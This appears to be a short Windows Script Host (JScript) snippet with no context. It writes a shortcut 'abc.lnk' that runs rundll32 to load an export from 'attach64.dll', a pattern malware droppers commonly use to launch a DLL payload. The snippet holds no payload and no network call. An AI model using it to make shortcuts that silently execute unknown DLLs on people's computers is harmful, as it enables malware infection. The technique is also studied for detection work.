var wsh = WScript.CreateObject("WScript.Shell");
var shortcut = wsh.CreateShortcut("abc.lnk");
shortcut.TargetPath = "rundll32";
shortcut.Arguments = "attach64.dll,open";
shortcut.WorkingDirectory = "c:\\";
shortcut.Save();
